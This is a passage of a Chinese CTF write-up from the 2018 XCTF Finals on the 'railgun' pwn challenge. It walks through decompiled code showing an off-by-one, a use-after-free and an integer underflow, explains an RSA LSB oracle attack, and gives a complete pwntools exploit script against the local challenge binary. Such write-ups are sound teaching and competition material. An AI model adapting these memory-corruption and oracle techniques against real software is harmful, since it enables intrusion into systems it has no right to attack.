<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v0 &#x3D; malloc(0x100uLL);</span><br><span class="line">description_addr &#x3D; v0;</span><br><span class="line">v1 &#x3D; read_nSize((__int64)v0, 255);</span><br><span class="line">*((_BYTE *)description_addr + v1) &#x3D; 0;</span><br><span class="line">printf(&quot;[-]name:&quot;, 255LL);</span><br><span class="line">*((_BYTE *)&amp;name_addr + (signed int)read_nSize((__int64)&amp;name_addr, 31)) &#x3D; 0;</span><br></pre></td></tr></table></figure>
<p>modify:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case 1u:</span><br><span class="line">  puts(&quot;[+]modify player information&quot;);</span><br><span class="line">  printf(&quot;[-]description:&quot;, v3);</span><br><span class="line">  v4 &#x3D; read_nSize((__int64)description_addr, 255);</span><br><span class="line">  *((_BYTE *)description_addr + v4) &#x3D; 0;</span><br><span class="line">  printf(&quot;[-]name:&quot;, 255LL);</span><br><span class="line">  v3 &#x3D; 32LL;</span><br><span class="line">  *((_BYTE *)&amp;name_addr + (signed int)read_nSize((__int64)&amp;name_addr, 32)) &#x3D; 0;</span><br><span class="line">  continue;</span><br></pre></td></tr></table></figure>
<p>可以看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*((_BYTE *)&amp;name_addr + (signed int)read_nSize((__int64)&amp;name_addr, 31)) &#x3D; 0;</span><br><span class="line">*((_BYTE *)&amp;name_addr + (signed int)read_nSize((__int64)&amp;name_addr, 32)) &#x3D; 0;</span><br></pre></td></tr></table></figure>
<p>存在off by one<br>可以覆盖第一个aes key地址的低字节为\x00<br>而调试可以看到覆盖为\x00后，此aes key会落在description中<br>由此第一个aes key可控</p>
<h5 id="UAF"><a href="#UAF" class="headerlink" title="UAF:"></a>UAF:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">case 6u:</span><br><span class="line">  puts(&quot;[+]accelerator attack&quot;);</span><br><span class="line">  if ( (unsigned __int8)coin_num &lt;&#x3D; 0xC7u || dword_5633C0F880F0 !&#x3D; 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;[+]no much more coins or boss_9 is deleted already&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    coin_num +&#x3D; 56;</span><br><span class="line">    free(ptr);</span><br><span class="line">    dword_5633C0F880F0 &#x3D; 9;</span><br><span class="line">    puts(&quot;[+]delete boss_9&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><strong>可以看到以accelerator attack来delete boss 9后会free(ptr),但没有置空指针，存在UAF</strong><br>而后可以利用comment：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">case 7u:</span><br><span class="line">  puts(&quot;[+]comment for railgun&quot;);</span><br><span class="line">  if ( comment_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 &#x3D; (signed __int64)comment_addr;</span><br><span class="line">    printf(&quot;[+]%s\n&quot;, comment_addr);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;[-]comment lenth:&quot;, v3);</span><br><span class="line">  nptr[(signed int)read_nSize((__int64)nptr, 4)] &#x3D; 0;</span><br><span class="line">  v10 &#x3D; atoi(nptr);</span><br><span class="line">  if ( v10 &gt; 0 &amp;&amp; v8 &lt;&#x3D; 256 )</span><br><span class="line">  &#123;</span><br><span class="line">    comment_addr &#x3D; malloc(v10);</span><br><span class="line">    printf(&quot;[-]comment:&quot;, 4LL);</span><br><span class="line">    v3 &#x3D; (unsigned int)(v10 - 1);</span><br><span class="line">    *((_BYTE *)comment_addr + (signed int)read_nSize((__int64)comment_addr, v3)) &#x3D; 0;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;[+]bad comment&quot;);</span><br><span class="line">  return 0LL;</span><br></pre></td></tr></table></figure>
<p><strong>利用 comment_addr = malloc(v10)分配comment到已free的ptr的地方并覆盖，这样boss 9对应的aes key便会可控</strong></p>
<h5 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h5><p><strong>由uaf或者off by one可以控制第一和第十个aes key，之后依然可以kill boss 0/9，此时kill后因为aes密钥已知，返回AES_encode(pow(input,rsa_d,rsa_n))即可知pow(input,rsa_d,rsa_n)&amp;0xF</strong></p>
<h5 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h5><p>看到kill boss后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( v5 &#x3D;&#x3D; 1 )</span><br><span class="line">&#123;</span><br><span class="line">  --coin_num;</span><br><span class="line">  printf(&quot;[+]pickup:&quot;, 4LL);</span><br><span class="line">  put_hex_str((__int64)&amp;v16, 0x10u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当coin_num为1时kill boss<br>而后再使用一个coin，此处没有检测coin_num而直接–coin_num;<br>便会造成整形溢出为0xFF(255)<br>这样会省去mining coins的时间</p>
<h5 id="RSA-LSB-Oracle-Attack："><a href="#RSA-LSB-Oracle-Attack：" class="headerlink" title="RSA LSB Oracle Attack："></a>RSA LSB Oracle Attack：</h5><p>由上可知，程序可以不断获得pow(input,rsa_d,rsa_n)&amp;0xF<br>那么就可以使用类似RSA LSB Oracle Attack从低位每次得到4 bits，最终拼接为flag+padding而获得flag<br>其中rsa明文可用index attack得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case 4u:</span><br><span class="line">  puts(&quot;[+]index attack&quot;);</span><br><span class="line">  printf(&quot;[+]&quot;, v3);</span><br><span class="line">  put_str(rsa_addr);</span><br><span class="line">  continue;</span><br></pre></td></tr></table></figure>
<p>rsa_e已知<br>rsa_n可用3输出status时得到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">case 3u:</span><br><span class="line">  puts(&quot;[+]game status&quot;);</span><br><span class="line">  printf(&quot;[+]name:%s\n&quot;, &amp;name_addr);</span><br><span class="line">  printf(&quot;[+]description:%s\n&quot;, description_addr);</span><br><span class="line">  v3 &#x3D; (unsigned __int8)coin_num;</span><br><span class="line">  printf(&quot;[+]coin:%d\n&quot;, (unsigned __int8)coin_num);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 &#x3D; (unsigned int)i;</span><br><span class="line">    printf(&quot;[+]boss_%d level%d &quot;, (unsigned int)i, *(unsigned __int8 *)(*(&amp;name_addr + i + 4LL) + 16LL));</span><br><span class="line">    if ( *(_BYTE *)(*(&amp;name_addr + i + 4LL) + 17LL) )</span><br><span class="line">      puts(&quot;alive&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;dead&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;[+]pub:&quot;);</span><br><span class="line">  put_str(rsa_n);</span><br></pre></td></tr></table></figure>
<p>即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;a*16^x+b(a未知，b已知)</span><br><span class="line">y&#x3D;16^(-x)mod n</span><br><span class="line">Y&#x3D;y^e mod n</span><br><span class="line">input&#x3D;rsa_c*Y&#x3D;(m*y)^e mod n</span><br><span class="line">pow(input,rsa_d,n)&#x3D;m*y&#x3D;((a+b*16^(-x))mod n)&amp;0xF  &#x2F;&#x2F;rsa_decode</span><br><span class="line">b*16^(-x))mod n已知-&gt;可得a&amp;0xF</span><br><span class="line">其实不是&amp;0xF，而是最后一个不是\x00的位的最低4bits：</span><br><span class="line">  v2 &#x3D; strlen(v1);</span><br><span class="line">  v11 &#x3D; s[v2 - 1];</span><br><span class="line">或者输入rsa_c*16^(xe),最后返回为</span><br></pre></td></tr></table></figure>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import libnum</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def get_pass_sha256():</span><br><span class="line">   p.recvuntil(&quot;:&quot;)</span><br><span class="line">   sha256_encode&#x3D;p.recvuntil(&quot;+&quot;)[:-1]</span><br><span class="line">   rand_4bytes&#x3D;p.recvuntil(&quot;\n&quot;).strip().decode(&quot;hex&quot;)</span><br><span class="line">   ans&#x3D;rand_4bytes</span><br><span class="line">   for i in range(0,256):</span><br><span class="line">     for j in range(0,256):</span><br><span class="line">       final&#x3D;ans+chr(i)+chr(j)</span><br><span class="line">       if sha256(final).hexdigest()&#x3D;&#x3D;sha256_encode:</span><br><span class="line">           p.recvuntil(&quot;PaD:&quot;)</span><br><span class="line">           p.sendline(final[-2:].encode(&quot;hex&quot;))</span><br><span class="line"></span><br><span class="line">def oracle_dec(cipher_rsa):</span><br><span class="line">    p.sendlineafter(&quot;[-]&quot;,&quot;5&quot;)</span><br><span class="line">    p.sendlineafter(&quot;[-]chose a boss:&quot;,&quot;0&quot;)</span><br><span class="line">    p.sendlineafter(&quot;[-]send:&quot;,cipher_rsa)</span><br><span class="line">    p.sendlineafter(&quot;[-]use coins(1&#x2F;0):&quot;,&quot;1&quot;)</span><br><span class="line">    enc &#x3D; p.recvuntil(&quot;\n&quot;).split(&quot;[+]pickup:&quot;)[1].split(&quot;\n&quot;)[0]</span><br><span class="line">    return encryption_suite.decrypt(enc.decode(&quot;hex&quot;))</span><br><span class="line"></span><br><span class="line">#context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line">p&#x3D;process(&quot;.&#x2F;railgun&quot;)</span><br><span class="line">encryption_suite &#x3D; AES.new(&#39;a&#39;*16, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">#first sha256</span><br><span class="line">get_pass_sha256()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;[-]description:&quot;,&quot;a&quot;*255)</span><br><span class="line">p.sendlineafter(&quot;[-]name:&quot;,&quot;a&quot;*31)</span><br><span class="line"></span><br><span class="line">#off by one</span><br><span class="line">p.sendlineafter(&quot;[-]&quot;,&quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;[-]description:&quot;,&quot;a&quot;*255)</span><br><span class="line">p.sendlineafter(&quot;[-]name:&quot;,&quot;0&quot;*32)</span><br><span class="line"></span><br><span class="line">#get rsa_c</span><br><span class="line">p.sendlineafter(&quot;[-]&quot;,&quot;4&quot;)</span><br><span class="line">p.recvuntil(&quot;[+]index attack\n[+]&quot;)</span><br><span class="line">cipher_rsa &#x3D; p.recvuntil(&quot;\n&quot;).split(&quot;\n&quot;)[0]</span><br><span class="line"></span><br><span class="line">#get rsa_n</span><br><span class="line">p.sendlineafter(&quot;[-]&quot;,&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;[+]pub:&quot;)</span><br><span class="line">n &#x3D; int(p.recvuntil(&quot;\n&quot;).split(&quot;\n&quot;)[0],16)</span><br><span class="line"></span><br><span class="line">#overflow-&gt;make coin_num 0xFF</span><br><span class="line">p.sendlineafter(&quot;[-]&quot;,&quot;2&quot;)</span><br><span class="line">get_pass_sha256()</span><br><span class="line"></span><br><span class="line">#RSA LSB Oracle Attack</span><br><span class="line">invmod_n &#x3D; libnum.invmod(16,n)</span><br><span class="line">flag &#x3D; int(cipher_rsa,16)</span><br><span class="line">final_flag,Y,e&#x3D;0,1,0x10001</span><br><span class="line">for bit in range(200):</span><br><span class="line">        leak_M &#x3D; oracle_dec(hex(flag*Y)[2:].upper())[0]</span><br><span class="line">        leak_m &#x3D; (int(leak_M, 16)+16-((final_flag*pow(invmod_n,bit,n))%n%16))%16</span><br><span class="line">        final_flag +&#x3D; (leak_m*(16**bit))</span><br><span class="line">        y &#x3D; pow(invmod_n, bit+1, n)</span><br><span class="line">        Y &#x3D; pow(y, e, n)</span><br><span class="line">print libnum.n2s(final_flag)[:64]</span><br></pre></td></tr></table></figure>
<p><strong>剩下的还有几个题目，队里其他大神做的，等到有时间再整理</strong></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-pubg"><span class="toc-number">1.</span> <span class="toc-text">0x01 pubg</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-railgun"><span class="toc-number">2.</span> <span class="toc-text">0x02  railgun</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">2.1.</span> <span class="toc-text">main:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#menu"><span class="toc-number">2.2.</span> <span class="toc-text">menu:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sha256："><span class="toc-number">2.3.</span> <span class="toc-text">sha256：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-enc"><span class="toc-number">2.4.</span> <span class="toc-text">flag_enc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#程序流程"><span class="toc-number">2.5.</span> <span class="toc-text">程序流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞"><span class="toc-number">2.6.</span> <span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#off-by-one"><span class="toc-number">2.6.1.</span> <span class="toc-text">off by one</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#UAF"><span class="toc-number">2.6.2.</span> <span class="toc-text">UAF:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AES"><span class="toc-number">2.6.3.</span> <span class="toc-text">AES</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#int-overflow"><span class="toc-number">2.6.4.</span> <span class="toc-text">int_overflow</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RSA-LSB-Oracle-Attack："><span class="toc-number">2.6.5.</span> <span class="toc-text">RSA LSB Oracle Attack：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.7.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/11/10/2018-XCTF-Finals/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&text=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&is_video=false&description=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2018-XCTF Finals&body=Check out this article: http://yoursite.com/2018/11/10/2018-XCTF-Finals/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&title=2018-XCTF Finals" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/11/10/2018-XCTF-Finals/&name=2018-XCTF Finals&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


